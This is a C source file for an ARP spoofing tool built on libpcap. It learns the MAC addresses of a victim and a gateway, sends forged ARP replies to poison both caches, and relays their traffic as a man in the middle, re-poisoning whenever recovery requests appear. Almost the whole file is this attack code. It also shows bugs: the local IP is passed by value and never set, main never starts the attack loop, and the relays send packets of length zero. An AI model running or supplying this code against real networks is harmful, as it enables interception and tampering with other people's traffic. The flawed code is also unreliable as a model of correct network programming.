#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pcap.h>
#include <netinet/if_ether.h>

#pragma pack(push, 1)


typedef struct eth_hdr_custom{
    uint8_t dest_mac[6];
	uint8_t source_mac[6];
	uint16_t eth_type;
}eth_hdr_custom;

typedef struct arp_hdr_custom{
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t hw_add_len;
    uint8_t proto_add_len;
    uint16_t opcode;
}arp_hdr_custom;

typedef struct ip_hdr_custom{
    uint8_t ip_hl:4;
    uint8_t ip_ver:4;
    uint8_t ip_tos;
    uint16_t ip_len;
    uint16_t ip_off;
    uint8_t ip_ttl;
    uint8_t ip_pro;
    uint16_t ip_check;
    struct in_addr ip_src, ip_dest;
}ip_hdr_custom;

// function for dump
void dump(const uint8_t* p, int len) {
	for(int i=0; i<len; i++) {
		printf("%02x ", *p);
		p++;
		if((i & 0x0f) == 0x0f)
			printf("\n");
	}
}

// fucnction for printing MAC Address
void print_mac(uint8_t *mac, int len) {
	for(int i=0;i<len;i++)
	{
		printf("%02x", mac[i]);
		if(i<5)
			printf(":");
	}
    printf("\n");
}

// Get Local MAC ADDRESS & IP ADDRESS
int check_my_add(uint8_t *my_mac, struct in_addr my_ip, const char *interface)
{
    struct ifreq buf;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0)
    {
        perror("ERROR : socket!");
        return -1;
    }

    strncpy(buf.ifr_name, interface, IFNAMSIZ-1);

    // MAC Address
    if(ioctl(sock, SIOCGIFHWADDR, &buf) < 0)
    {
        perror("ERROR : ioctl - MAC!");
        return -1;
    }
    for(int i=0;i<6;i++)
        my_mac[i] = buf.ifr_hwaddr.sa_data[i];

    //IP Address
    if(ioctl(sock, SIOCGIFADDR, &buf) < 0)
    {
        perror("ERROR : ioctl - IP");
        return -1;
    }
    my_ip = ((struct sockaddr_in *)&buf.ifr_addr)->sin_addr;

    // Print the addresses
    printf("my IP  : %s\nmy MAC : ", inet_ntoa(my_ip));
    print_mac(my_mac, 6);
    printf("\n");

    return 0;
}

// Get VICTIM'S MAC ADDRESS
int victim_mac_req(uint8_t *my_mac, uint8_t *v_mac, struct in_addr my_ip, struct in_addr v_ip, const char *interface)
{
    int debug = 0;
    eth_hdr_custom *ETH = (eth_hdr_custom*)malloc(sizeof(eth_hdr_custom));
    arp_hdr_custom *ARP = (arp_hdr_custom*)malloc(sizeof(arp_hdr_custom));
    char errbuf[PCAP_ERRBUF_SIZE];
    char send_buf[BUFSIZ];
    int offset = 0;
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL)
    {
        perror("ERROR : handle is NULL");
        return -1;
    }

    /***************************Send Request**************************/
    // Ethernet Header Setting
    memset(ETH->dest_mac, 0xFF, sizeof(ETH->dest_mac));
    memcpy(ETH->source_mac, my_mac, sizeof(ETH->source_mac));
    ETH->eth_type = ntohs(ETHERTYPE_ARP);
    memcpy(send_buf, ETH, sizeof(eth_hdr_custom));

    offset += sizeof(eth_hdr_custom);

    // ARP Data Setting
    ARP->hw_type = ntohs((uint16_t)(1));
    ARP->proto_type = ntohs((uint16_t)(0x0800));
    ARP->hw_add_len = (uint8_t)(6);
    ARP->proto_add_len = (uint8_t)(4);
    ARP->opcode = ntohs((uint16_t)(1));

    memcpy(&send_buf[offset], ARP, sizeof(arp_hdr_custom));
    offset += sizeof(arp_hdr_custom);

    // ARP Address Data Setting
    memcpy(&send_buf[offset], my_mac, 6);
    offset += 6;
    memcpy(&send_buf[offset], &my_ip, 4);
    offset += 4;
    for(int i=0;i<6;i++)
        send_buf[offset + i] = 0;
    offset += 6;
    memcpy(&send_buf[offset], &v_ip, 4);
    offset += 4;
    
    // SEND REQUEST
    if(pcap_sendpacket(handle, (u_char*)(send_buf), offset) < 0)
    {
        perror("ERROR : ARP Request to Victim Fail");
        return -1;
    }

    /***************************Receive Reply**************************/
    while(true)
    {
        struct pcap_pkthdr* header;
        const u_char *rcv_buf;
        eth_hdr_custom *rcv_eth;
        arp_hdr_custom *rcv_arp;
        int res = pcap_next_ex(handle, &header, &rcv_buf);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        rcv_eth = (eth_hdr_custom *)rcv_buf;
        if(ntohs(rcv_eth->eth_type) == 0x0806)  // ARP Packet
        {
            rcv_buf += sizeof(eth_hdr_custom);
            rcv_arp = (arp_hdr_custom *)rcv_buf;
            rcv_buf += sizeof(arp_hdr_custom);
            if((rcv_arp->hw_type == ntohs((uint16_t)(1))) &&        // Check ARP -> Ether & IP
                (rcv_arp->proto_type == ntohs((uint16_t)(0x0800))) &&
                (rcv_arp->hw_add_len == (uint8_t)(6)) &&
                (rcv_arp->proto_add_len == (uint8_t)(4)) &&
                (rcv_arp->opcode == ntohs((uint16_t)(2))))
            {
                if(!(memcmp(rcv_buf + 6, &v_ip, 4) | memcmp(rcv_buf + 10, my_mac, 6) | memcmp(rcv_buf + 16, &my_ip, 4)))  // Check Me & Victim
                {
                    for(int i=0;i<6;i++)
                    {
                        v_mac[i] = (uint8_t)rcv_buf[i];
                    } 
                    printf("MAC = ");
                    print_mac(v_mac, 6);
                    printf("\n");
                    free(ETH);
                    free(ARP);
                    return 0; 
                } // if(correct Address)
            } // if(correct ARP type)
        } // if(ethertype = ARP)
    }   //while(all packet)
    free(ETH);
    free(ARP);
    return -1;
}

// Send ARP Reply to the victim (INFECTION CODE)
int send_arp_reply(pcap_t* handle, uint8_t *my_mac, uint8_t *v_mac, struct in_addr v_ip, struct in_addr t_ip, const char *interface)
{
    int debug = 0;
    eth_hdr_custom *ETH = (eth_hdr_custom*)malloc(sizeof(eth_hdr_custom));
    arp_hdr_custom *ARP = (arp_hdr_custom*)malloc(sizeof(arp_hdr_custom));
    char send_buf[BUFSIZ];
    int offset = 0;

    /***************************Send Request**************************/
    // Ethernet Header Setting
    memcpy(ETH->dest_mac, v_mac, sizeof(ETH->dest_mac));
    memcpy(ETH->source_mac, my_mac, sizeof(ETH->source_mac));
    ETH->eth_type = ntohs(ETHERTYPE_ARP);
    memcpy(send_buf, ETH, sizeof(eth_hdr_custom));

    offset += sizeof(eth_hdr_custom);

    // ARP Data Setting
    ARP->hw_type = ntohs((uint16_t)(1));
    ARP->proto_type = ntohs((uint16_t)(0x0800));
    ARP->hw_add_len = (uint8_t)(6);
    ARP->proto_add_len = (uint8_t)(4);
    ARP->opcode = ntohs((uint16_t)(2));

    memcpy(&send_buf[offset], ARP, sizeof(arp_hdr_custom));
    offset += sizeof(arp_hdr_custom);

    // ARP Address Data Setting
    memcpy(&send_buf[offset], my_mac, 6);
    offset += 6;
    memcpy(&send_buf[offset], &t_ip, 4);        // <target_ip> instead of <my_ip>
    offset += 4;
    memcpy(&send_buf[offset], &v_mac, 6);
    offset += 6;
    memcpy(&send_buf[offset], &v_ip, 4);
    offset += 4;
    
    // SEND REQUEST
    if(pcap_sendpacket(handle, (u_char*)(send_buf), offset) < 0)
    {
        perror("ERROR : ARP Attack - sendpacket Failure");
        return -1;
    }

    printf("ARP Fake Packet Sent\n");
    dump((u_char* )send_buf, offset);
    printf("\n\n");

    free(ETH);
    free(ARP);
    return 0;
}

// Relay the IP Packet
int ip_packet_relay(u_char *rcv_buf, int len, uint8_t *my_mac, uint8_t *v_mac, uint8_t *t_mac, struct in_addr v_ip, const char *interface)
{
    eth_hdr_custom *rcv_eth;
    ip_hdr_custom *rcv_ip;
    rcv_eth = (eth_hdr_custom *)rcv_buf;
    if((memcmp((rcv_eth->source_mac), v_mac, sizeof(rcv_eth->source_mac)) == 0)
    && (memcmp((rcv_eth->dest_mac), my_mac, sizeof(rcv_eth->dest_mac)) == 0)
    && (ntohs(rcv_eth->eth_type) == ETHERTYPE_IP))
    {
        int debug = 0;
        char errbuf[PCAP_ERRBUF_SIZE];
        int offset = 0;
        pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
        if(handle == NULL)
        {
            perror("ERROR : handle is NULL");
            return -1;
        }

        memcpy((rcv_eth->source_mac), my_mac, sizeof(rcv_eth->source_mac));
        memcpy((rcv_eth->dest_mac), t_mac, sizeof(rcv_eth->dest_mac));
        memcpy(rcv_buf, rcv_eth, sizeof(eth_hdr_custom));

        if(pcap_sendpacket(handle, (u_char*)(rcv_buf), len) < 0)
        {
            perror("ERROR : ARP Attack - sendpacket Failure");
            return -1;
        }
    } // if(target packet)
    return 0;
}

// ATTACK : Detect Recovery , Infection, Relay
int sender_attack(uint8_t *my_mac, uint8_t *v_mac, uint8_t *t_mac, struct in_addr my_ip, struct in_addr v_ip, struct in_addr t_ip, const char *interface)
{
    // PCAP_OPEN
    int debug = 0;
    char errbuf[PCAP_ERRBUF_SIZE];
    char send_buf[BUFSIZ];
    int offset = 0;
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL)
    {
        perror("ERROR : handle is NULL");
        return -1;
    }   
    
    // initial infection
    send_arp_reply(handle, my_mac, v_mac, v_ip, t_ip, interface);   // Sender Attack
    send_arp_reply(handle, my_mac, t_mac, t_ip, v_ip, interface);   // Router Attack

    while(true)
    {
        struct pcap_pkthdr* header;
        const u_char *rcv_buf;
        eth_hdr_custom *rcv_eth;
        arp_hdr_custom *rcv_arp;
        ip_hdr_custom *rcv_ip;
        int res = pcap_next_ex(handle, &header, &rcv_buf);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        rcv_eth = (eth_hdr_custom *)rcv_buf;

        // detect : sender -> target ARP REQUEST
        if((memcmp(rcv_eth->source_mac, v_mac, 6) == 0) && (ntohs(rcv_eth->eth_type) == ETHERTYPE_ARP))
        {
            rcv_buf += sizeof(eth_hdr_custom);
            rcv_arp = (arp_hdr_custom *)rcv_buf;
            rcv_buf += sizeof(arp_hdr_custom);
            if(!(memcmp(rcv_buf, v_mac, 6) | memcmp(rcv_buf + 6, &v_ip, 4) | memcmp(rcv_buf + 16, &t_ip, 4)))
            {
                printf("Victim's ARP Request DETECTED!\n\n");
                send_arp_reply(handle, my_mac, v_mac, v_ip, t_ip, interface);
                send_arp_reply(handle, my_mac, t_mac, t_ip, v_ip, interface);
            }
        }
        
        // detect : target -> sender ARP REQUEST
        else if((memcmp(rcv_eth->source_mac, t_mac, 6) == 0) && (ntohs(rcv_eth->eth_type) == ETHERTYPE_ARP))
        {
            rcv_buf += sizeof(eth_hdr_custom);
            rcv_arp = (arp_hdr_custom *)rcv_buf;
            rcv_buf += sizeof(arp_hdr_custom);
            if(!(memcmp(rcv_buf, t_mac, 6) | memcmp(rcv_buf + 6, &t_ip, 4) | memcmp(rcv_buf + 16, &v_ip, 4)))
            {
                printf("Target's ARP Request DETECTED!\n\n");
                send_arp_reply(handle, my_mac, v_mac, v_ip, t_ip, interface);
                send_arp_reply(handle, my_mac, t_mac, t_ip, v_ip, interface);
            }
        }

        // relay : sender -> target IP Packet
        else if((memcmp(rcv_eth->source_mac, v_mac, 6) == 0) && (ntohs(rcv_eth->eth_type) == ETHERTYPE_IP))
        {
            memcpy(rcv_eth->source_mac, my_mac, 6);
            memcpy(rcv_eth->dest_mac, t_mac, 6);
            if(pcap_sendpacket(handle, (u_char*)(rcv_buf), offset) < 0)
            {
                perror("ERROR : relay(sender->target) - sendpacket Failure");
                return -1;
            }
        }

        // relay : target -> sender IP Packet
        else if((memcmp(rcv_eth->source_mac, t_mac, 6) == 0) && (ntohs(rcv_eth->eth_type) == ETHERTYPE_IP))
        {
            rcv_buf += sizeof(eth_hdr_custom);
            rcv_ip = (ip_hdr_custom*)rcv_buf;
            if(!memcmp(&(rcv_ip->ip_dest), &v_ip, sizeof(struct in_addr)))  //check the IP Packet's dest = victim
            {
                memcpy(rcv_eth->source_mac, my_mac, 6);
                memcpy(rcv_eth->dest_mac, v_mac, 6);
                if(pcap_sendpacket(handle, (u_char*)(rcv_buf), offset) < 0)
                {
                    perror("ERROR : relay(sender->target) - sendpacket Failure");
                    return -1;
                }
            }
        }
    }   //while(scan packets)
}

int main(int argc, char *argv[])
{
    if(argc != 4)
    {
        printf("Execute Code should be\narp_spoof <interface> <send ip> <target ip>");
        return -1;
    }

    // USE CUSTOM ARP_HEADER
    arphdr *ARP;
    struct in_addr victim_ip, target_ip, my_ip;
    uint8_t my_mac[6], victim_mac[6], target_mac[6];
    uint8_t errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle;

    // Set victim_ip, target_ip
    if(inet_pton(AF_INET, argv[2], &victim_ip) == 0)
        perror("ERROR : wrong INPUT IP Address! - victim");
    if(inet_pton(AF_INET, argv[3], &target_ip) == 0)
        perror("ERROR : wrong INPUT IP Address! - target");

    // Get my local MAC / IP address
    if(check_my_add(my_mac, my_ip, argv[1]) < 0)
        return -1;

    // Get Victim's MAC Address
    printf("Victim's ");
    if(victim_mac_req(my_mac, victim_mac, my_ip, victim_ip, argv[1]) < 0)
        return -1;
    // Get Target's MAC Address
    printf("Target's ");
    if(victim_mac_req(my_mac, target_mac, my_ip, target_ip, argv[1]) < 0)
        return -1;



    return 0;
}
